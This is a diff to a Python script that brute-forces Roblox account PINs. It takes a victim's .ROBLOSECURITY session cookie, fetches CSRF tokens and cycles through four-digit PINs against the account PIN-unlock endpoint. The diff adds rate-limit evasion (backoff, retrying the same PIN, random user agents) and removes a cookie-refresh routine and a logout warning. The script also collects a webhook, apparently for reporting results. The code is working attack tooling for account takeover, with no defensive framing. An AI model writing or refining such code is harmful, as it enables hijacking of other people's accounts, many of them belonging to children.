@@ -7780,7 +7780,6 @@ try:
   webhook = input()
   check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
   if check.status_code ==200:
-    cprint("Warning: You'll be logged out. This is done to make sure the cookie doesn't expire", 'red')
     for char in 'Cracking the pin....':
       time.sleep(0.1)
       cprint(char, 'magenta', end='', flush=True)
@@ -7794,21 +7793,15 @@ try:
           '.ROBLOSECURITY': cookie
       })
       return xsrfRequest.headers["x-csrf-token"]
-    def refresh(fname):
-      print(1)
-      cookies = {
-      '.ROBLOSECURITY': fname
-      }
-      headers = {
-      'X-CSRF-TOKEN': getXsrf(fname)
-      }
-      request = requests.post('https://www.roblox.com/authentication/signoutfromallsessionsandreauthenticate', cookies=cookies, headers=headers).headers['set-cookie']
-      request = request[request.index('.ROBLOSECURITY='):len(request)]
-      request = request[15:request.index(';')]
-      cprint(f'Refreshing cookie: {request}')
-      return request
     c = 0
     waitTime = 1
+    cookies = {
+    '.ROBLOSECURITY': cookie
+    }
+    headers = {
+    'X-CSRF-TOKEN': getXsrf(cookie),
+    "User-Agent": random.choice(userAgents)
+    }
     while True:
       c = c + 1
       v = c
@@ -7816,14 +7809,6 @@ try:
         v = f'0{v}'
       pin = str(v)[1:5]
       cprint(f"Trying {pin}")
-      cookie = refresh(cookie)
-      cookies = {
-      '.ROBLOSECURITY': cookie
-      }
-      headers = {
-      'X-CSRF-TOKEN': getXsrf(cookie),
-      "User-Agent": random.choice(userAgents)
-      }
       time.sleep(waitTime)
       time.sleep(2)
       waitTime = 0
@@ -7840,9 +7825,15 @@ try:
         elif response['errors'][0]['code'] == 0:
           if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
             cprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "red")
+            break
           elif response['errors'][0]['message'] == 'Token Validation Failed':
             cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
-          break
+            break
+          elif response['errors'][0]['message'] == 'TooManyRequests':
+            waitTime = waitTime * 1.5
+            cprint(f'Too many requests. Waiting 60 seconds before resumimg', 'yellow')
+            waitTime = 60
+            c = c - 1
       except KeyError:
         cprint("Cookie:", 'blue')
         print(cookie)
